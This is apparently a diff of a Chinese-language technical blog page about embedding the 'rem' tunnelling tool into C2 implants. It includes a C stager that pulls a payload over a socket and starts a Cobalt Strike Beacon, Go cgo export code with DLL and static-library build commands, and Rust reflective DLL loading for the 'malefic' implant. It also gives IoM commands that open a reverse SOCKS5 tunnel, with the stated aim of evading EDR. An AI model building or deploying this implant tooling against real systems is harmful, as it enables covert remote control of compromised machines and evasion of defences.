+</code></pre></div></p>
+<p>implant需要自行实现，我让ai生成了一段简单的代码</p>
+<div class="highlight"><pre><span></span><code><span class="w">    </span><span class="n">WSADATA</span><span class="w"> </span><span class="n">wsaData</span><span class="p">;</span>
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">WSAStartup</span><span class="p">(</span><span class="n">MAKEWORD</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span><span class="w"> </span><span class="mi">2</span><span class="p">),</span><span class="w"> </span><span class="o">&amp;</span><span class="n">wsaData</span><span class="p">)</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;WSAStartup failed: %d</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">WSAGetLastError</span><span class="p">());</span>
+<span class="w">        </span><span class="k">return</span><span class="p">;</span>
+<span class="w">    </span><span class="p">}</span>
+
+<span class="w">    </span><span class="cm">/* 创建 socket */</span>
+<span class="w">    </span><span class="n">SOCKET</span><span class="w"> </span><span class="n">sock</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span><span class="w"> </span><span class="n">SOCK_STREAM</span><span class="p">,</span><span class="w"> </span><span class="n">IPPROTO_TCP</span><span class="p">);</span>
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">sock</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="n">INVALID_SOCKET</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;socket failed: %d</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">WSAGetLastError</span><span class="p">());</span>
+<span class="w">        </span><span class="n">WSACleanup</span><span class="p">();</span>
+<span class="w">        </span><span class="k">return</span><span class="p">;</span>
+<span class="w">    </span><span class="p">}</span>
+<span class="w">    </span><span class="cm">/* 配置服务器地址 */</span>
+
+<span class="w">    </span><span class="k">struct</span><span class="w"> </span><span class="nc">sockaddr_in</span><span class="w"> </span><span class="n">server</span><span class="p">;</span>
+<span class="w">    </span><span class="n">server</span><span class="p">.</span><span class="n">sin_family</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">AF_INET</span><span class="p">;</span>
+<span class="w">    </span><span class="n">server</span><span class="p">.</span><span class="n">sin_port</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">htons</span><span class="p">(</span><span class="mi">26019</span><span class="p">);</span><span class="w"> </span><span class="c1">// 指定端口，例如 12345</span>
+<span class="w">    </span><span class="n">server</span><span class="p">.</span><span class="n">sin_addr</span><span class="p">.</span><span class="n">s_addr</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">inet_addr</span><span class="p">(</span><span class="s">&quot;127.0.0.1&quot;</span><span class="p">);</span><span class="w"> </span><span class="c1">// 指定 IP，例如本地 127.0.0.1</span>
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">connect</span><span class="p">(</span><span class="n">sock</span><span class="p">,</span><span class="w"> </span><span class="p">(</span><span class="k">struct</span><span class="w"> </span><span class="nc">sockaddr</span><span class="w"> </span><span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">server</span><span class="p">,</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="n">server</span><span class="p">))</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="n">SOCKET_ERROR</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;connect failed: %d</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">WSAGetLastError</span><span class="p">());</span>
+<span class="w">        </span><span class="n">closesocket</span><span class="p">(</span><span class="n">sock</span><span class="p">);</span>
+<span class="w">        </span><span class="n">WSACleanup</span><span class="p">();</span>
+<span class="w">        </span><span class="k">return</span><span class="p">;</span>
+<span class="w">    </span><span class="p">}</span>
+<span class="w">    </span>
+<span class="w">    </span><span class="cm">/* 从 socket 获取 payload */</span>
+<span class="w">    </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">srvpayload</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">malloc</span><span class="p">(</span><span class="n">PAYLOAD_MAX_SIZE</span><span class="p">);</span>
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="n">srvpayload</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;malloc failed</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+<span class="w">        </span><span class="n">closesocket</span><span class="p">(</span><span class="n">sock</span><span class="p">);</span>
+<span class="w">        </span><span class="n">WSACleanup</span><span class="p">();</span>
+<span class="w">        </span><span class="k">return</span><span class="p">;</span>
+<span class="w">    </span><span class="p">}</span>
+<span class="w">    </span><span class="kt">int</span><span class="w"> </span><span class="n">srvpayloadLen</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">read_frame_sock</span><span class="p">(</span><span class="n">sock</span><span class="p">,</span><span class="w"> </span><span class="n">srvpayload</span><span class="p">,</span><span class="w"> </span><span class="n">PAYLOAD_MAX_SIZE</span><span class="p">);;</span>
+
+<span class="w">    </span><span class="cm">/* 启动 Beacon */</span>
+<span class="w">    </span><span class="n">HANDLE</span><span class="w"> </span><span class="n">handle_beacon</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">start_beacon</span><span class="p">(</span><span class="n">srvpayload</span><span class="p">,</span><span class="w"> </span><span class="n">srvpayloadLen</span><span class="p">);</span>
+</code></pre></div>
+<p><img alt="" src="../assets/Pasted%20image%2020250409235950.png" /></p>
+<p>这样就可以复用刚才提过的rem实现的各种隐蔽的流量侧特性与多协议传输层。 大大拓展了原本CS只支持DNS、HTTP、TCP的三种传输层。</p>
+<h2 id="嵌入到rust-implant中">嵌入到rust implant中<a class="headerlink" href="#嵌入到rust-implant中" title="Permanent link">&para;</a></h2>
+<p>如果了解我们在开发的另一个项目 下一代进攻性基础设施---Internet of Malice 应该早已看到IoM的tunnel/proxy 相关功能都交由rem实现。 </p>
+<p>而rem是基于golang开发的， golang在这一块的生态完整度远超rust。 那么，该如何打通rem与IoM的交互呢？</p>
+<p>传统的做法，上传然后执行二进制程序，又或者将其打包成dll/so随着implant投递。 </p>
+<p>对于IoM来说， IoM提供了反射动态加载dll以及反射加载PE等等功能， 我们可以基于我们的进攻性基础设施， 完成更加OPSEC的加载。 </p>
+<h3 id="方法1-反射加载exe程序">方法1 反射加载EXE程序<a class="headerlink" href="#方法1-反射加载exe程序" title="Permanent link">&para;</a></h3>
+<p>rust implant的execute_exe 能完美加载rem， 就像在本地使用一样。 </p>
+<div class="highlight"><pre><span></span><code>execute_exe rem.exe -- -c [rem_link] ... 
+</code></pre></div>
+<p>缺点是会派生新进程， 在核晶或者EDR场景中， 会留下暴露面。 </p>
+<h3 id="方法2-动态加载dll">方法2 动态加载dll<a class="headerlink" href="#方法2-动态加载dll" title="Permanent link">&para;</a></h3>
+<p>先将rem打成dll， 这里需要用到Cgo， 跨语言的互操作如果语言没有提供特殊的机制， 大多基于FFI实现。 </p>
+<p>这段代码暴露了一个类似命令行程序的函数， 能接收字符串， 并解析参数执行rem。 </p>
+<p><a href="https://github.com/chainreactors/rem-community/blob/master/cmd/export/main.go">https://github.com/chainreactors/rem-community/blob/master/cmd/export/main.go</a></p>
+<div class="highlight"><pre><span></span><code><span class="c1">//export RemDial</span>
+<span class="kd">func</span><span class="w"> </span><span class="nx">RemDial</span><span class="p">(</span><span class="nx">cmdline</span><span class="w"> </span><span class="o">*</span><span class="nx">C</span><span class="p">.</span><span class="nx">char</span><span class="p">)</span><span class="w"> </span><span class="p">(</span><span class="o">*</span><span class="nx">C</span><span class="p">.</span><span class="nx">char</span><span class="p">,</span><span class="w"> </span><span class="nx">C</span><span class="p">.</span><span class="kt">int</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="kd">var</span><span class="w"> </span><span class="nx">option</span><span class="w"> </span><span class="nx">runner</span><span class="p">.</span><span class="nx">Options</span>
+<span class="w">    </span><span class="nx">args</span><span class="p">,</span><span class="w"> </span><span class="nx">err</span><span class="w"> </span><span class="o">:=</span><span class="w"> </span><span class="nx">shellquote</span><span class="p">.</span><span class="nx">Split</span><span class="p">(</span><span class="nx">C</span><span class="p">.</span><span class="nx">GoString</span><span class="p">(</span><span class="nx">cmdline</span><span class="p">))</span>
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="nx">err</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="kc">nil</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="nx">utils</span><span class="p">.</span><span class="nx">Log</span><span class="p">.</span><span class="nx">Debugf</span><span class="p">(</span><span class="s">&quot;RemDial error: failed to split command line: %v&quot;</span><span class="p">,</span><span class="w"> </span><span class="nx">err</span><span class="p">)</span>
+<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="kc">nil</span><span class="p">,</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="c1">// 错误ID 1: 命令行解析错误</span>
+<span class="w">    </span><span class="p">}</span>
+
+<span class="w">    </span><span class="nx">err</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="nx">option</span><span class="p">.</span><span class="nx">ParseArgs</span><span class="p">(</span><span class="nx">args</span><span class="p">)</span>
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="nx">err</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="kc">nil</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="nx">utils</span><span class="p">.</span><span class="nx">Log</span><span class="p">.</span><span class="nx">Debugf</span><span class="p">(</span><span class="s">&quot;RemDial error: failed to parse arguments: %v&quot;</span><span class="p">,</span><span class="w"> </span><span class="nx">err</span><span class="p">)</span>
+<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="kc">nil</span><span class="p">,</span><span class="w"> </span><span class="mi">2</span><span class="w"> </span><span class="c1">// 错误ID 2: 参数解析错误</span>
+<span class="w">    </span><span class="p">}</span>
+
+<span class="w">    </span><span class="o">......</span>
+
+<span class="w">    </span><span class="c1">// 启动一个新的goroutine来处理agent</span>
+<span class="w">    </span><span class="k">go</span><span class="w"> </span><span class="kd">func</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="nx">err</span><span class="w"> </span><span class="o">:=</span><span class="w"> </span><span class="nx">a</span><span class="p">.</span><span class="nx">Handler</span><span class="p">()</span>
+<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="nx">err</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="kc">nil</span><span class="w"> </span><span class="p">{</span>
+<span class="w">            </span><span class="nx">utils</span><span class="p">.</span><span class="nx">Log</span><span class="p">.</span><span class="nx">Error</span><span class="p">(</span><span class="nx">err</span><span class="p">)</span>
+<span class="w">        </span><span class="p">}</span>
+<span class="w">        </span><span class="nx">agent</span><span class="p">.</span><span class="nx">Agents</span><span class="p">.</span><span class="nx">Map</span><span class="p">.</span><span class="nx">Delete</span><span class="p">(</span><span class="nx">a</span><span class="p">.</span><span class="nx">ID</span><span class="p">)</span>
+<span class="w">    </span><span class="p">}()</span>
+
+<span class="w">    </span><span class="k">for</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="nx">a</span><span class="p">.</span><span class="nx">Init</span><span class="w"> </span><span class="p">{</span>
+<span class="w">            </span><span class="k">break</span>
+<span class="w">        </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span>
+<span class="w">            </span><span class="nx">time</span><span class="p">.</span><span class="nx">Sleep</span><span class="p">(</span><span class="mi">100</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="nx">time</span><span class="p">.</span><span class="nx">Millisecond</span><span class="p">)</span>
+<span class="w">        </span><span class="p">}</span>
+<span class="w">    </span><span class="p">}</span>
+
+<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="nx">C</span><span class="p">.</span><span class="nx">CString</span><span class="p">(</span><span class="nx">a</span><span class="p">.</span><span class="nx">ID</span><span class="p">),</span><span class="w"> </span><span class="mi">0</span><span class="w"> </span><span class="c1">// 成功，返回agent ID</span>
+<span class="p">}</span>
+</code></pre></div>
+<div class="highlight"><pre><span></span><code>go<span class="w"> </span>build<span class="w"> </span>-buildmode<span class="o">=</span>c-shared<span class="w"> </span>-o<span class="w"> </span>dist/rem.dll<span class="w"> </span>-ldflags<span class="w"> </span><span class="s2">&quot;-s -w&quot;</span><span class="w"> </span>-buildvcs<span class="o">=</span><span class="nb">false</span><span class="w"> </span>.<span class="se">\c</span>md<span class="se">\e</span>xport<span class="se">\</span>
+</code></pre></div>
+<p>这个是FFI的公头， 在rust中实现对应的母头， 但是略微不同的是， 我们不会采用原始的加载DLL的方式，而是更加OPSEC的反射加载。 
+<a href="https://github.com/chainreactors/malefic/blob/master/malefic-helper/src/common/rem/rem_reflection.rs">https://github.com/chainreactors/malefic/blob/master/malefic-helper/src/common/rem/rem_reflection.rs</a></p>
+<p><div class="highlight"><pre><span></span><code><span class="cp">#[cfg(target_os = </span><span class="s">&quot;windows&quot;</span><span class="cp">)]</span><span class="w">  </span>
+<span class="cp">#[cfg(feature = </span><span class="s">&quot;prebuild&quot;</span><span class="cp">)]</span><span class="w">  </span>
+<span class="k">pub</span><span class="w"> </span><span class="k">unsafe</span><span class="w"> </span><span class="k">fn</span><span class="w"> </span><span class="nf">load_module</span><span class="p">(</span><span class="n">bins</span><span class="p">:</span><span class="w"> </span><span class="nb">Vec</span><span class="o">&lt;</span><span class="kt">u8</span><span class="o">&gt;</span><span class="p">,</span><span class="w"> </span><span class="n">bundle</span><span class="p">:</span><span class="w"> </span><span class="nb">String</span><span class="p">)</span><span class="w"> </span><span class="p">-&gt;</span><span class="w"> </span><span class="nb">Result</span><span class="o">&lt;*</span><span class="k">const</span><span class="w"> </span><span class="n">c_void</span><span class="p">,</span><span class="w"> </span><span class="n">CommonError</span><span class="o">&gt;</span><span class="w"> </span><span class="p">{</span><span class="w">  </span>
+<span class="w">    </span><span class="k">use</span><span class="w"> </span><span class="k">crate</span><span class="p">::</span><span class="n">win</span><span class="p">::</span><span class="n">kit</span><span class="p">::{</span><span class="n">MaleficLoadLibrary</span><span class="p">,</span><span class="w"> </span><span class="n">AUTO_RUN_DLL_MAIN</span><span class="p">,</span><span class="w"> </span><span class="n">LOAD_MEMORY</span><span class="p">};</span><span class="w">  </span>
+
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="n">bins</span><span class="p">.</span><span class="n">is_empty</span><span class="p">()</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="n">bundle</span><span class="p">.</span><span class="n">is_empty</span><span class="p">()</span><span class="w"> </span><span class="p">{</span><span class="w">  </span>
+<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="nb">Err</span><span class="p">(</span><span class="n">ArgsError</span><span class="p">(</span><span class="n">obfstr</span><span class="o">!</span><span class="p">(</span><span class="s">&quot;bins or bundle is empty :)&quot;</span><span class="p">).</span><span class="n">to_string</span><span class="p">()));</span><span class="w">  </span>
+<span class="w">    </span><span class="p">}</span><span class="w">  </span>
+<span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="n">new_bundle</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="fm">format!</span><span class="p">(</span><span class="s">&quot;{}{}&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">bundle</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;</span><span class="se">\x00</span><span class="s">&quot;</span><span class="p">);</span><span class="w">  </span>
+<span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="n">dark_module</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">MaleficLoadLibrary</span><span class="p">(</span><span class="w">  </span>
+<span class="w">        </span><span class="n">AUTO_RUN_DLL_MAIN</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">LOAD_MEMORY</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="kt">u32</span><span class="p">,</span><span class="w">  </span>
+<span class="w">        </span><span class="n">null</span><span class="p">(),</span><span class="w">  </span>
+<span class="w">        </span><span class="n">bins</span><span class="p">.</span><span class="n">as_ptr</span><span class="p">()</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="n">_</span><span class="p">,</span><span class="w">  </span>
+<span class="w">        </span><span class="n">bins</span><span class="p">.</span><span class="n">len</span><span class="p">(),</span><span class="w">  </span>
+<span class="w">        </span><span class="n">new_bundle</span><span class="p">.</span><span class="n">as_ptr</span><span class="p">()</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="n">_</span><span class="p">,</span><span class="w">  </span>
+<span class="w">    </span><span class="p">)</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="n">_</span><span class="p">;</span><span class="w">  </span>
+
+<span class="w">    </span><span class="nb">Ok</span><span class="p">(</span><span class="n">dark_module</span><span class="p">)</span><span class="w">  </span>
+<span class="p">}</span>
+
+<span class="cp">#[cfg(target_os = </span><span class="s">&quot;windows&quot;</span><span class="cp">)]</span><span class="w">  </span>
+<span class="cp">#[cfg(feature = </span><span class="s">&quot;prebuild&quot;</span><span class="cp">)]</span><span class="w">  </span>
+<span class="k">pub</span><span class="w"> </span><span class="k">unsafe</span><span class="w"> </span><span class="k">fn</span><span class="w"> </span><span class="nf">get_function_address</span><span class="p">(</span><span class="n">module_base</span><span class="p">:</span><span class="w"> </span><span class="o">*</span><span class="k">const</span><span class="w"> </span><span class="n">c_void</span><span class="p">,</span><span class="w"> </span><span class="n">function_name</span><span class="p">:</span><span class="w"> </span><span class="kp">&amp;</span><span class="kt">str</span><span class="p">)</span><span class="w"> </span><span class="p">-&gt;</span><span class="w"> </span><span class="o">*</span><span class="k">const</span><span class="w"> </span><span class="n">c_void</span><span class="w"> </span><span class="p">{</span><span class="w">  </span>
+<span class="w">    </span><span class="k">use</span><span class="w"> </span><span class="k">crate</span><span class="p">::</span><span class="n">win</span><span class="p">::</span><span class="n">kit</span><span class="p">::</span><span class="n">MaleficGetFuncAddrWithModuleBaseDefault</span><span class="p">;</span><span class="w">  </span>
+
+<span class="w">    </span><span class="n">MaleficGetFuncAddrWithModuleBaseDefault</span><span class="p">(</span><span class="w">  </span>
+<span class="w">        </span><span class="n">module_base</span><span class="p">,</span><span class="w">  </span>
+<span class="w">        </span><span class="n">function_name</span><span class="p">.</span><span class="n">as_ptr</span><span class="p">(),</span><span class="w">  </span>
+<span class="w">        </span><span class="n">function_name</span><span class="p">.</span><span class="n">len</span><span class="p">(),</span><span class="w">  </span>
+<span class="w">    </span><span class="p">)</span><span class="w">  </span>
+<span class="p">}</span>
+
+
+<span class="c1">// 反射加载dll并解析对应的函数</span>
+<span class="k">unsafe</span><span class="w"> </span><span class="k">fn</span><span class="w"> </span><span class="nf">initialize_functions</span><span class="p">()</span><span class="w"> </span><span class="p">-&gt;</span><span class="w"> </span><span class="nb">Result</span><span class="o">&lt;</span><span class="p">(),</span><span class="w"> </span><span class="nb">String</span><span class="o">&gt;</span><span class="w"> </span><span class="p">{</span><span class="w">  </span>
+<span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="n">dll_bytes</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">REM_DLL</span><span class="w">  </span>
+<span class="w">        </span><span class="p">.</span><span class="n">get</span><span class="p">()</span><span class="w">  </span>
+<span class="w">        </span><span class="p">.</span><span class="n">ok_or</span><span class="p">(</span><span class="s">&quot;REM not initialize, please load rem.dll&quot;</span><span class="p">)</span><span class="o">?</span><span class="p">;</span><span class="w">  </span>
+
+<span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="n">module</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">load_module</span><span class="p">(</span><span class="n">dll_bytes</span><span class="p">.</span><span class="n">clone</span><span class="p">(),</span><span class="w"> </span><span class="nb">String</span><span class="p">::</span><span class="n">from</span><span class="p">(</span><span class="s">&quot;rem&quot;</span><span class="p">))</span><span class="w">  </span>
+<span class="w">        </span><span class="p">.</span><span class="n">map_err</span><span class="p">(</span><span class="o">|</span><span class="n">e</span><span class="o">|</span><span class="w"> </span><span class="fm">format!</span><span class="p">(</span><span class="s">&quot;Failed to load module: {:?}&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">e</span><span class="p">))</span><span class="o">?</span><span class="p">;</span><span class="w">  </span>
+
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="n">module</span><span class="p">.</span><span class="n">is_null</span><span class="p">()</span><span class="w"> </span><span class="p">{</span><span class="w">  </span>
+<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="nb">Err</span><span class="p">(</span><span class="s">&quot;Failed to load module: module is null&quot;</span><span class="p">.</span><span class="n">to_string</span><span class="p">());</span><span class="w">  </span>
+<span class="w">    </span><span class="p">}</span><span class="w">  </span>
+
+<span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="n">module_base</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">module</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="o">*</span><span class="k">const</span><span class="w"> </span><span class="n">_</span><span class="p">;</span><span class="w">  </span>
+
+<span class="w">    </span><span class="c1">// 获取各个函数的地址  </span>
+<span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="n">rem_dial_addr</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">get_function_address</span><span class="p">(</span><span class="n">module_base</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;RemDial&quot;</span><span class="p">);</span><span class="w">  </span>
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="n">rem_dial_addr</span><span class="p">.</span><span class="n">is_null</span><span class="p">()</span><span class="w"> </span><span class="p">{</span><span class="w">  </span>
+<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="nb">Err</span><span class="p">(</span><span class="s">&quot;Failed to get RemDial function&quot;</span><span class="p">.</span><span class="n">to_string</span><span class="p">());</span><span class="w">  </span>
+<span class="w">    </span><span class="p">}</span><span class="w">  </span>
+<span class="w">    </span><span class="n">REM_FUNCTIONS</span><span class="p">.</span><span class="n">rem_dial</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">Some</span><span class="p">(</span><span class="n">std</span><span class="p">::</span><span class="n">mem</span><span class="p">::</span><span class="n">transmute</span><span class="p">(</span><span class="n">rem_dial_addr</span><span class="p">));</span>
+<span class="w">    </span><span class="nb">Ok</span><span class="p">(())</span>
+<span class="p">}</span>
+</code></pre></div>
+对应工具函数已经在IoM中实现， 也可以将其他FFI程序通过类似的方法实现。</p>
+<p>暴露REM函数
+<div class="highlight"><pre><span></span><code><span class="k">extern</span><span class="w"> </span><span class="s">&quot;C&quot;</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="k">fn</span><span class="w"> </span><span class="nf">RemDial</span><span class="p">(</span><span class="n">cmdline</span><span class="p">:</span><span class="w"> </span><span class="o">*</span><span class="k">const</span><span class="w"> </span><span class="n">c_char</span><span class="p">)</span><span class="w"> </span><span class="p">-&gt;</span><span class="w"> </span><span class="p">(</span><span class="o">*</span><span class="k">mut</span><span class="w"> </span><span class="n">c_char</span><span class="p">,</span><span class="w"> </span><span class="n">c_int</span><span class="p">);</span>
+<span class="w">    </span><span class="k">fn</span><span class="w"> </span><span class="nf">MemoryDial</span><span class="p">(</span><span class="n">memhandle</span><span class="p">:</span><span class="w"> </span><span class="o">*</span><span class="k">const</span><span class="w"> </span><span class="n">c_char</span><span class="p">,</span><span class="w"> </span><span class="n">dst</span><span class="p">:</span><span class="w"> </span><span class="o">*</span><span class="k">const</span><span class="w"> </span><span class="n">c_char</span><span class="p">)</span><span class="w"> </span><span class="p">-&gt;</span><span class="w"> </span><span class="p">(</span><span class="n">c_int</span><span class="p">,</span><span class="w"> </span><span class="n">c_int</span><span class="p">);</span>
+<span class="w">    </span><span class="k">fn</span><span class="w"> </span><span class="nf">MemoryRead</span><span class="p">(</span><span class="n">handle</span><span class="p">:</span><span class="w"> </span><span class="nc">c_int</span><span class="p">,</span><span class="w"> </span><span class="n">buf</span><span class="p">:</span><span class="w"> </span><span class="o">*</span><span class="k">mut</span><span class="w"> </span><span class="n">c_void</span><span class="p">,</span><span class="w"> </span><span class="n">size</span><span class="p">:</span><span class="w"> </span><span class="nc">c_int</span><span class="p">)</span><span class="w"> </span><span class="p">-&gt;</span><span class="w"> </span><span class="p">(</span><span class="n">c_int</span><span class="p">,</span><span class="w"> </span><span class="n">c_int</span><span class="p">);</span>
+<span class="w">    </span><span class="k">fn</span><span class="w"> </span><span class="nf">MemoryWrite</span><span class="p">(</span><span class="n">handle</span><span class="p">:</span><span class="w"> </span><span class="nc">c_int</span><span class="p">,</span><span class="w"> </span><span class="n">buf</span><span class="p">:</span><span class="w"> </span><span class="o">*</span><span class="k">const</span><span class="w"> </span><span class="n">c_void</span><span class="p">,</span><span class="w"> </span><span class="n">size</span><span class="p">:</span><span class="w"> </span><span class="nc">c_int</span><span class="p">)</span><span class="w"> </span><span class="p">-&gt;</span><span class="w"> </span><span class="p">(</span><span class="n">c_int</span><span class="p">,</span><span class="w"> </span><span class="n">c_int</span><span class="p">);</span>
+<span class="w">    </span><span class="k">fn</span><span class="w"> </span><span class="nf">MemoryClose</span><span class="p">(</span><span class="n">handle</span><span class="p">:</span><span class="w"> </span><span class="nc">c_int</span><span class="p">)</span><span class="w"> </span><span class="p">-&gt;</span><span class="w"> </span><span class="nc">c_int</span><span class="p">;</span>
+<span class="w">    </span><span class="k">fn</span><span class="w"> </span><span class="nf">CleanupAgent</span><span class="p">();</span>
+<span class="p">}</span>
+</code></pre></div></p>
+<p>对于使用者来说， 不需要关注这些细节， 相关代码已经在[IoM的插件仓库]<a href="https://github.com/chainreactors/mal-community/blob/master/community-proxy/modules/rem.lua">https://github.com/chainreactors/mal-community/blob/master/community-proxy/modules/rem.lua</a> ()中完成了对应的封装。</p>
+<p>在IoM命令行中执行以下代码即可安装并使用rem
+<div class="highlight"><pre><span></span><code><span class="c1"># 安装对应的插件</span>
+mal<span class="w"> </span>install<span class="w"> </span>community-proxy
+
+<span class="c1"># 加载rem dll</span>
+rem_community<span class="w"> </span>load
+
+<span class="c1"># 选择对应的rem pipeline, 搭建了反向代理隧道</span>
+rem_community<span class="w"> </span>socks5<span class="w"> </span>rem_pipeline
+</code></pre></div></p>
+<p>这个方法比<code>execute-exe</code>好的地方在于， 不会有新进程fork， 一切都在当前进程中完成。 </p>
+<h3 id="方法3-静态链接rem">方法3 静态链接rem<a class="headerlink" href="#方法3-静态链接rem" title="Permanent link">&para;</a></h3>
+<p>方法1和2都是解决上线后进一步搭建proxy/tunnel，要想让implant直接通过rem搭建的信道进行所有通讯，还需要一些技巧。 </p>
+<p>使用刚刚实现的rem的/cmd/export/main.go , 只需要修改下编译命令， 就能生成静态链接库给rust使用。</p>
+<div class="highlight"><pre><span></span><code>go<span class="w"> </span>build<span class="w"> </span>-buildmode<span class="o">=</span>c-archive<span class="w"> </span>-o<span class="w"> </span>dist/rem.a<span class="w"> </span>-ldflags<span class="w"> </span><span class="s2">&quot;-s -w&quot;</span><span class="w"> </span>-buildvcs<span class="o">=</span><span class="nb">false</span><span class="w"> </span>.<span class="se">\c</span>md<span class="se">\e</span>xport<span class="se">\</span>
+</code></pre></div>
+<p>在rust中实现对应的链接, 复用方法2中的rust定义即可。 </p>
+<p><a href="https://github.com/chainreactors/malefic/blob/master/malefic-helper/build.rs">https://github.com/chainreactors/malefic/blob/master/malefic-helper/build.rs</a>
+<div class="highlight"><pre><span></span><code><span class="cp">#[cfg(feature = </span><span class="s">&quot;rem_static&quot;</span><span class="cp">)]</span><span class="w">  </span>
+<span class="p">{</span><span class="w">  </span>
+<span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="n">resources_path</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">PathBuf</span><span class="p">::</span><span class="n">from</span><span class="p">(</span><span class="fm">env!</span><span class="p">(</span><span class="s">&quot;CARGO_MANIFEST_DIR&quot;</span><span class="p">))</span><span class="w">  </span>
+<span class="w">        </span><span class="p">.</span><span class="n">parent</span><span class="p">()</span><span class="w">  </span>
+<span class="w">        </span><span class="p">.</span><span class="n">unwrap</span><span class="p">()</span><span class="w">  </span>
+<span class="w">        </span><span class="p">.</span><span class="n">join</span><span class="p">(</span><span class="s">&quot;resources&quot;</span><span class="p">);</span><span class="w">  </span>
+
+<span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="n">target_os</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">env</span><span class="p">::</span><span class="n">var</span><span class="p">(</span><span class="s">&quot;CARGO_CFG_TARGET_OS&quot;</span><span class="p">).</span><span class="n">unwrap</span><span class="p">();</span><span class="w">  </span>
